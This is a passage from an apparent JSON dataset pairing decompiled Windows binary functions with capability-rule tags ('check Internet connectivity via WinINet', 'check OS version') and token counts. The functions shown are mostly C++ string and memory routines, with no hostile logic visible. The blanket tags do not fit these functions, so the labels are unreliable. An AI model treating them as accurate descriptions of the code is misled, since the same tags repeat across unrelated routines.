        "decompiled_code": "\nvoid __thiscall fcn.0048da50(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    \n    if ((*0x4f5bc0 == '\\0') && (iVar2 = fcn.004a39c0(0x4f5bc0),  iVar2 != 0)) {\n        if (*0x4f59f4 != 0) {\n            fcn.00418d00(0x4f74b4);\n        }\n        fcn.004a3aa0(0x4f5bc0);\n        fcn.004014c0(0x4a4390);\n    }\n    iVar2 = *0x506520;\n    if ((*0x4f59f4 != 0) && (iVar6 = fcn.00418d60(0x4f74b4),  iVar2 = *0x506520,  iVar6 != 0)) {\n        puVar3 = fcn.004a3610(4);\n        *puVar3 = 0x509dc8;\n        fcn.004a3bc0(puVar3, 0x506a48, 0x42a4f0);\n        goto code_r0x0048dbc0;\n    }\n    while (iVar2 != 0) {\n        iVar2 = fcn.00432500();\n        if (iVar2 == param_3) {\n            iVar6 = fcn.00432500();\n            iVar2 = param_3;\n            goto code_r0x0048dac9;\n        }\n        uVar7 = fcn.00432500();\n        if (uVar7 == param_3) goto code_r0x0048dc00;\n        iVar2 = *((uVar7 >> 0x20) + 8);\n    }\n    iVar5 = *(param_1 + 0xc);\n    param_3 = param_3 * 4;\n    iVar6 = -1;\n    ppiVar4 = iVar5 + param_3;\n    if (*ppiVar4 != NULL) goto code_r0x0048dad8;\n    while (piVar1 = param_2 + 1,  *0x4f59f4 != 0) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n        iVar2 = *0x4f59f4;\n        iVar5 = *(param_1 + 0xc);\n        *(iVar5 + param_3) = param_2;\n        if (iVar6 != -1) {\n            if (iVar2 == 0) goto code_r0x0048db2f;\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            iVar2 = *0x4f59f4;\n            *(*(param_1 + 0xc) + iVar6 * 4) = param_2;\n        }\n        while( true ) {\n            if (iVar2 == 0) {\n                return;\n            }\ncode_r0x0048dbc0:\n            iVar2 = fcn.00418dc0(0x4f74b4);\n            if (iVar2 == 0) {\n                return;\n            }\n            puVar3 = fcn.004a3610(4);\n            *puVar3 = 0x509ddc;\n            fcn.004a3bc0(puVar3, 0x506a54, 0x42a520);\ncode_r0x0048dc00:\n            iVar2 = fcn.00432500();\n            iVar6 = param_3;\ncode_r0x0048dac9:\n            iVar5 = *(param_1 + 0xc);\n            param_3 = iVar2 * 4;\n            ppiVar4 = iVar5 + param_3;\n            if (*ppiVar4 == NULL) break;\ncode_r0x0048dad8:\n            iVar2 = *0x4f59f4;\n            if (param_2 != NULL) {\n                (**(*param_2 + 4))();\n                iVar2 = *0x4f59f4;\n            }\n        }\n    }\n    param_2[1] = param_2[1] + 1;\n    *ppiVar4 = param_2;\n    if (iVar6 == -1) {\n        return;\n    }\ncode_r0x0048db2f:\n    param_2[1] = param_2[1] + 1;\n    *(iVar5 + iVar6 * 4) = param_2;\n    return;\n}\n",
        "token_count": 1046
    },
    "0048f620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048f620(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *param_1;\n    if (*0x4f59f4 == 0) {\n        iVar2 = *piVar1;\n        *piVar1 = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        return;\n    }\n    fcn.0048f130();\n    fcn.004a34c0(piVar1);\n    return;\n}\n",
        "token_count": 157
    },
    "0048f670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048f670(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *param_2;\n    if (*0x4f59f4 == 0) {\n        *piVar1 = *piVar1 + 1;\n        piVar1 = *param_1;\n    }\n    else {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n        piVar1 = *param_1;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar2 = *piVar1;\n        *piVar1 = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        *param_1 = *param_2;\n        return;\n    }\n    fcn.0048f130();\n    fcn.004a34c0(piVar1);\n    *param_1 = *param_2;\n    return;\n}\n",
        "token_count": 261
    },
    "004906f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __thiscall\nfcn.004906f0(int32_t **param_1, int32_t param_2, uint32_t param_3, int32_t **param_4, uint32_t param_5)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t in_stack_ffffffb8;\n    int32_t in_stack_ffffffbc;\n    \n    piVar1 = param_1[1];\n    if ((param_3 + 0x7fffffff) - piVar1 < param_5) {\n        fcn.0049ec30(0x502f28);\n        return in_stack_ffffffb8 - in_stack_ffffffbc;\n    }\n    ppiVar2 = *param_1;\n    piVar8 = (param_5 - param_3) + piVar1;\n    if (ppiVar2 == param_1 + 2) {\n        piVar5 = 0xf;\n    }\n    else {\n        piVar5 = param_1[2];\n    }\n    if (piVar5 < piVar8) {\n        fcn.00492830(param_2, param_3, param_4, param_5);\n        goto code_r0x004907c0;\n    }\n    puVar4 = ppiVar2 + param_2;\n    iVar6 = piVar1 - (param_2 + param_3);\n    bVar9 = iVar6 != 0;\n    bVar10 = param_3 != param_5;\n    if ((param_4 < ppiVar2) || (piVar1 + ppiVar2 < param_4)) {\n        if (bVar10 && bVar9) {\n            if (iVar6 == 1) {\n                puVar4[param_5] = puVar4[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar4 + param_5, puVar4 + param_3, iVar6);\n            }\n        }\n        if (param_5 == 0) goto code_r0x004907c0;\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memcpy(puVar4, param_4, param_5);\n            goto code_r0x004907c0;\n        }\n    }\n    else {\n        if ((param_5 == 0) || (param_3 < param_5)) {\ncode_r0x0049090d:\n            if (bVar10 && bVar9) goto code_r0x00490820;\n        }\n        else {\n            if (param_5 == 1) {\n                *puVar4 = *param_4;\n                goto code_r0x0049090d;\n            }\n            sub.msvcrt.dll_memmove(puVar4, param_4, param_5);\n            if (!bVar10 || !bVar9) goto code_r0x004907c0;\ncode_r0x00490820:\n            if (iVar6 == 1) {\n                puVar4[param_5] = puVar4[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar4 + param_5, puVar4 + param_3, iVar6);\n            }\n        }\n        if (param_5 <= param_3) goto code_r0x004907c0;\n        ppiVar2 = puVar4 + param_3;\n        if (ppiVar2 < param_4 + param_5) {\n            if (param_4 < ppiVar2) {\n                iVar6 = ppiVar2 - param_4;\n                if (iVar6 == 1) {\n                    *puVar4 = *param_4;\n                }\n                else if (iVar6 != 0) {\n                    sub.msvcrt.dll_memmove(puVar4, param_4, iVar6);\n                }\n                iVar7 = param_5 - iVar6;\n                if (iVar7 == 1) {\n                    puVar4[iVar6] = puVar4[param_5];\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memcpy(puVar4 + iVar6, puVar4 + param_5, iVar7);\n                }\n            }\n            else {\n                puVar3 = (param_5 - param_3) + param_4;\n                if (param_5 == 1) {\n                    *puVar4 = *puVar3;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar4, puVar3, param_5);\n                }\n            }\n            goto code_r0x004907c0;\n        }\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memmove(puVar4, param_4, param_5);\n            goto code_r0x004907c0;\n        }\n    }\n    *puVar4 = *param_4;\ncode_r0x004907c0:\n    param_1[1] = piVar8;\n    *(*param_1 + piVar8) = 0;\n    return param_1;\n}\n",
        "token_count": 1166
    },
    "00490a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00490a40(char **param_1, char *param_2, uint param_3)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *unaff_ESI;\n    \n    uVar1 = param_3;\n    if (param_2 < 0x10) {\n        pcVar2 = *param_1;\n        pcVar3 = param_2;\n    }\n    else {\n        pcVar3 = unaff_ESI;\n        pcVar2 = fcn.004927b0(&param_2, 0);\n        *param_1 = pcVar2;\n        param_1[2] = pcVar3;\n        unaff_ESI = pcVar3;\n    }\n    if (pcVar3 != NULL) {\n        if (pcVar3 == 0x1) {\n            *pcVar2 = uVar1;\n            param_1[1] = unaff_ESI;\n            (*param_1)[unaff_ESI] = '\\0';\n            return;\n        }\n        sub.msvcrt.dll_memset(pcVar2, uVar1, pcVar3);\n        pcVar3 = unaff_ESI;\n        pcVar2 = *param_1;\n    }\n    param_1[1] = pcVar3;\n    pcVar2[pcVar3] = '\\0';\n    return;\n}\n",
        "token_count": 306
    },
    "00490c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __thiscall fcn.00490c10(int32_t *param_1, uchar *param_2, uchar *param_3)\n\n{\n    uchar *puVar1;\n    int32_t *extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar2;\n    int32_t iStack68;\n    uint32_t uStack60;\n    uchar *puStack56;\n    int32_t *piStack52;\n    uchar *puStack48;\n    uchar *puStack40;\n    int32_t iStack36;\n    int32_t iStack24;\n    \n    if ((param_2 == NULL) && (param_3 != NULL)) {\n        puStack48 = 0x490cc8;\n        fcn.0049eb30(0x502f94);\n        puStack48 = param_2;\n        puStack56 = param_3;\n        piStack52 = param_1;\n        if ((puStack40 == NULL) && (iStack36 != 0)) {\n            fcn.0049eb30(0x502f94);\n            return extraout_ECX_00 + 8;\n        }\n        uVar2 = iStack36 - puStack40;\n        uStack60 = uVar2;\n        if (uVar2 < 0x10) {\n            puVar1 = *extraout_ECX;\n            if (uVar2 == 1) {\n                *puVar1 = *puStack40;\n                puVar1 = *extraout_ECX;\n                extraout_ECX[1] = 1;\n                puVar1[1] = 0;\n                return puVar1;\n            }\n            if (uVar2 == 0) {\n                extraout_ECX[1] = 0;\n                *puVar1 = 0;\n                return puVar1;\n            }\n        }\n        else {\n            puVar1 = fcn.004927b0(&stack0xffffffc4, 0);\n            *extraout_ECX = puVar1;\n            extraout_ECX[2] = iStack68;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, puStack40, uVar2);\n        puVar1 = *extraout_ECX;\n        extraout_ECX[1] = iStack68;\n        puVar1[iStack68] = 0;\n        return puVar1;\n    }\n    if (param_3 - param_2 < 0x10) {\n        piStack52 = *param_1;\n        if (param_3 - param_2 == 1) {\n            *piStack52 = *param_2;\n            puVar1 = *param_1;\n            param_1[1] = 1;\n            puVar1[1] = 0;\n            return puVar1;\n        }\n        if (param_3 == param_2) {\n            param_1[1] = 0;\n            *piStack52 = 0;\n            return piStack52;\n        }\n    }\n    else {\n        puStack48 = 0x490c8a;\n        piStack52 = fcn.004927b0();\n        *param_1 = piStack52;\n        param_1[2] = iStack24;\n    }\n    puStack48 = param_2;\n    puStack56 = 0x490ca6;\n    sub.msvcrt.dll_memcpy();\n    puVar1 = *param_1;\n    param_1[1] = iStack24;\n    puVar1[iStack24] = 0;\n    return puVar1;\n}\n",
        "token_count": 778
    },
    "00490cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __thiscall fcn.00490cd0(int32_t *param_1, uchar *param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t iStack24;\n    uint32_t uStack16;\n    \n    if ((param_2 == NULL) && (param_3 != 0)) {\n        fcn.0049eb30(0x502f94);\n        return extraout_ECX + 8;\n    }\n    uVar2 = param_3 - param_2;\n    uStack16 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *param_1;\n        if (uVar2 == 1) {\n            *puVar1 = *param_2;\n            puVar1 = *param_1;\n            param_1[1] = 1;\n            puVar1[1] = 0;\n            return puVar1;\n        }\n        if (uVar2 == 0) {\n            param_1[1] = 0;\n            *puVar1 = 0;\n            return puVar1;\n        }\n    }\n    else {\n        puVar1 = fcn.004927b0(&uStack16, 0);\n        *param_1 = puVar1;\n        param_1[2] = iStack24;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, param_2, uVar2);\n    puVar1 = *param_1;\n    param_1[1] = iStack24;\n    puVar1[iStack24] = 0;\n    return puVar1;\n}\n",
        "token_count": 378
    },
    "00490e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00490e30(uchar *param_1, uchar *param_2, uchar *param_3)\n\n{\n    if (param_3 - param_2 == 1) {\n        *param_1 = *param_2;\n        return;\n    }\n    if (param_3 == param_2) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x004278b0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)();\n    return;\n}\n",
        "token_count": 126
    },
    "00490f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00490f00(int32_t *param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    char cStack48;\n    \n    iVar4 = param_1[1];\n    if (param_4 <= (param_3 + 0x7fffffff) - iVar4) {\n        piVar2 = *param_1;\n        uVar6 = (param_4 - param_3) + iVar4;\n        if (piVar2 == param_1 + 2) {\n            uVar5 = 0xf;\n        }\n        else {\n            uVar5 = param_1[2];\n        }\n        if (uVar5 < uVar6) {\n            cStack48 = param_4;\n            fcn.00492830(param_2, param_3, 0);\n            piVar2 = *param_1;\n        }\n        else {\n            iVar4 = iVar4 - (param_2 + param_3);\n            if ((iVar4 != 0) && (param_3 != param_4)) {\n                puVar3 = piVar2 + param_3 + param_2;\n                puVar1 = piVar2 + param_4 + param_2;\n                if (iVar4 == 1) {\n                    *puVar1 = *puVar3;\n                    piVar2 = *param_1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar1, puVar3, iVar4);\n                    piVar2 = *param_1;\n                }\n            }\n        }\n        if (param_4 != 0) {\n            if (param_4 == 1) {\n                *(piVar2 + unaff_ESI) = cStack48;\n                piVar2 = *param_1;\n            }\n            else {\n                sub.msvcrt.dll_memset(piVar2 + unaff_ESI, cStack48, param_4);\n                piVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar6;\n        *(piVar2 + uVar6) = 0;\n        return param_1;\n    }\n    fcn.0049ec30(0x502ee0);\n    return extraout_ECX;\n}\n",
        "token_count": 565
    },
    "004924e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004924e0(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    \n    uVar2 = param_1[1];\n    if (param_2 < uVar2) {\n        param_2 = uVar2;\n    }\n    puVar3 = *param_1;\n    piVar1 = param_1 + 2;\n    if (piVar1 == puVar3) {\n        uVar6 = 0xf;\n    }\n    else {\n        uVar6 = param_1[2];\n    }\n    if (uVar6 != param_2) {\n        if ((0xf < param_2) || (uVar6 < param_2)) {\n            puVar4 = fcn.004927b0(&param_2, uVar6);\n            puVar3 = *param_1;\n            iVar5 = param_1[1] + 1;\n            if (iVar5 == 1) {\n                *puVar4 = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar5);\n            }\n            if (puVar3 != piVar1) {\n                fcn.004a34c0(puVar3);\n            }\n            *param_1 = puVar4;\n            param_1[2] = unaff_EBP;\n            return;\n        }\n        if (piVar1 != puVar3) {\n            iVar5 = uVar2 + 1;\n            if (iVar5 == 1) {\n                *(param_1 + 2) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                sub.msvcrt.dll_memcpy(piVar1, puVar3, iVar5);\n            }\n            fcn.004a34c0(puVar3);\n            *param_1 = piVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "004925e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004925e0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = param_1[1];\n    iVar2 = *param_1;\n    iVar4 = iVar1 - (param_2 + param_3);\n    if ((iVar4 != 0) && (param_3 != 0)) {\n        puVar3 = param_2 + param_3 + iVar2;\n        if (iVar4 == 1) {\n            *(iVar2 + param_2) = *puVar3;\n            iVar2 = *param_1;\n            iVar1 = param_1[1];\n        }\n        else {\n            sub.msvcrt.dll_memmove(iVar2 + param_2, puVar3, iVar4);\n            iVar2 = *param_1;\n            iVar1 = param_1[1];\n        }\n    }\n    param_1[1] = iVar1 - param_3;\n    *(iVar2 + (iVar1 - param_3)) = 0;\n    return;\n}\n",
        "token_count": 265
    },
    "00492660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00492660(int32_t *param_1, uchar *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    iVar2 = param_1[1];\n    piVar3 = *param_1;\n    uVar1 = iVar2 + param_3;\n    if (piVar3 == param_1 + 2) {\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = param_1[2];\n    }\n    if (uVar4 < uVar1) {\n        fcn.00492830(iVar2, 0, param_2, param_3);\n        piVar3 = *param_1;\n    }\n    else if (param_3 != 0) {\n        if (param_3 == 1) {\n            *(piVar3 + iVar2) = *param_2;\n            piVar3 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar3 + iVar2, param_2, param_3);\n            piVar3 = *param_1;\n        }\n    }\n    param_1[1] = uVar1;\n    *(piVar3 + uVar1) = 0;\n    return param_1;\n}\n",
        "token_count": 311
    },
    "00492700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00492700(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uStack40;\n    uint32_t auStack32 [4];\n    \n    if (param_1 != param_2) {\n        puVar2 = *param_1;\n        uVar1 = param_2[1];\n        if (param_1 + 2 == puVar2) {\n            uVar3 = 0xf;\n        }\n        else {\n            uVar3 = param_1[2];\n        }\n        if (uVar3 < uVar1) {\n            auStack32[0] = uVar1;\n            puVar2 = fcn.004927b0(auStack32, uVar3);\n            if (param_1 + 2 != *param_1) {\n                fcn.004a34c0(*param_1);\n            }\n            *param_1 = puVar2;\n            param_1[2] = uStack40;\n        }\n        if (uVar1 != 0) {\n            if (uVar1 == 1) {\n                *puVar2 = **param_2;\n                puVar2 = *param_1;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar2, *param_2, uVar1);\n                puVar2 = *param_1;\n            }\n        }\n        param_1[1] = uVar1;\n        *(puVar2 + uVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00492830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00492830(int32_t **param_1, uchar *param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t *piStack40;\n    int32_t aiStack32 [4];\n    \n    aiStack32[0] = (param_5 - param_3) + param_1[1];\n    if (param_1 + 2 == *param_1) {\n        piVar2 = 0xf;\n    }\n    else {\n        piVar2 = param_1[2];\n    }\n    piVar2 = fcn.004927b0(aiStack32, piVar2);\n    ppiVar1 = *param_1;\n    if (param_2 != NULL) {\n        if (param_2 == 0x1) {\n            *piVar2 = *ppiVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar2, ppiVar1, param_2);\n        }\n    }\n    if ((param_2 != NULL) && (param_3 != 0)) {\n        if (param_3 == 1) {\n            *(piVar2 + param_2) = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar2 + param_2, param_2, param_3);\n        }\n    }\n    if (iStack64 != 0) {\n        if (iStack64 == 1) {\n            (param_2 + param_3)[piVar2] = *(iStack60 + ppiVar1);\n        }\n        else {\n            sub.msvcrt.dll_memcpy(param_2 + param_3 + piVar2, iStack60 + ppiVar1, iStack64);\n        }\n    }\n    if (param_1 + 2 != ppiVar1) {\n        fcn.004a34c0(ppiVar1);\n    }\n    *param_1 = piVar2;\n    param_1[2] = piStack40;\n    return;\n}\n",
        "token_count": 483
    },
    "00493470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __thiscall\nfcn.00493470(int32_t **param_1, int32_t param_2, uint32_t param_3, int32_t **param_4, uint32_t param_5)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t in_stack_ffffffc8;\n    int32_t in_stack_ffffffcc;\n    \n    piVar3 = param_1[1];\n    if ((param_3 + 0x3fffffff) - piVar3 < param_5) {\n        fcn.0049ec30(\"basic_string::_M_replace\");\n        return in_stack_ffffffc8 - in_stack_ffffffcc;\n    }\n    ppiVar4 = *param_1;\n    piVar8 = (param_5 - param_3) + piVar3;\n    if (ppiVar4 == param_1 + 2) {\n        piVar6 = 0x7;\n    }\n    else {\n        piVar6 = param_1[2];\n    }\n    if (piVar6 < piVar8) {\n        fcn.004956c0(param_2, param_3, param_4, param_5);\n        goto code_r0x0049353e;\n    }\n    puVar1 = ppiVar4 + param_2 * 2;\n    iVar5 = piVar3 - (param_2 + param_3);\n    bVar9 = iVar5 != 0;\n    bVar10 = param_3 != param_5;\n    if ((param_4 < ppiVar4) || (ppiVar4 + piVar3 * 2 < param_4)) {\n        if (bVar10 && bVar9) {\n            if (iVar5 == 1) {\n                puVar1[param_5] = puVar1[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + param_5, puVar1 + param_3, iVar5 * 2);\n            }\n        }\n        if (param_5 == 0) goto code_r0x0049353e;\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memcpy(puVar1, param_4, param_5 * 2);\n            goto code_r0x0049353e;\n        }\n    }\n    else {\n        if ((param_5 == 0) || (param_3 < param_5)) {\ncode_r0x0049369e:\n            if (bVar10 && bVar9) goto code_r0x004935a1;\n        }\n        else {\n            if (param_5 == 1) {\n                *puVar1 = *param_4;\n                goto code_r0x0049369e;\n            }\n            sub.msvcrt.dll_memmove(puVar1, param_4, param_5 * 2);\n            if (!bVar10 || !bVar9) goto code_r0x0049353e;\ncode_r0x004935a1:\n            if (iVar5 == 1) {\n                puVar1[param_5] = puVar1[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar1 + param_5, puVar1 + param_3, iVar5 * 2);\n            }\n        }\n        if (param_5 <= param_3) goto code_r0x0049353e;\n        iVar5 = param_5 * 2;\n        ppiVar4 = puVar1 + param_3;\n        if (ppiVar4 < param_4 + iVar5) {\n            if (param_4 < ppiVar4) {\n                iVar5 = ppiVar4 - param_4;\n                iVar7 = iVar5 >> 1;\n                if (iVar7 == 1) {\n                    *puVar1 = *param_4;\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memmove(puVar1, param_4, iVar5);\n                }\n                iVar7 = param_5 - iVar7;\n                if (iVar7 == 1) {\n                    *(puVar1 + iVar5) = puVar1[param_5];\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memcpy(puVar1 + iVar5, puVar1 + param_5, iVar7 * 2);\n                }\n            }\n            else {\n                puVar2 = param_4 + (param_5 - param_3) * 2;\n                if (param_5 == 1) {\n                    *puVar1 = *puVar2;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar1, puVar2, iVar5);\n                }\n            }\n            goto code_r0x0049353e;\n        }\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memmove(puVar1, param_4, iVar5);\n            goto code_r0x0049353e;\n        }\n    }\n    *puVar1 = *param_4;\ncode_r0x0049353e:\n    param_1[1] = piVar8;\n    *(*param_1 + piVar8 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 1215
    },
    "004937f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004937f0(int32_t *param_1, uint32_t param_2, uint param_3)\n\n{\n    uint uVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EBP;\n    \n    uVar1 = param_3;\n    if (param_2 < 8) {\n        puVar2 = *param_1;\n    }\n    else {\n        uVar4 = unaff_EBP;\n        puVar2 = fcn.00495640(&param_2, 0);\n        param_2 = uVar4;\n        *param_1 = puVar2;\n        param_1[2] = param_2;\n    }\n    if (param_2 != 0) {\n        puVar3 = puVar2;\n        uVar4 = param_2;\n        if (param_2 == 1) {\n            *puVar2 = uVar1;\n        }\n        else {\n            do {\n                *puVar3 = uVar1;\n                uVar4 = uVar4 - 1;\n                puVar3 = puVar3 + 1;\n            } while (uVar4 != 0);\n        }\n    }\n    param_1[1] = param_2;\n    puVar2[param_2] = 0;\n    return;\n}\n",
        "token_count": 303
    },
    "00493990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
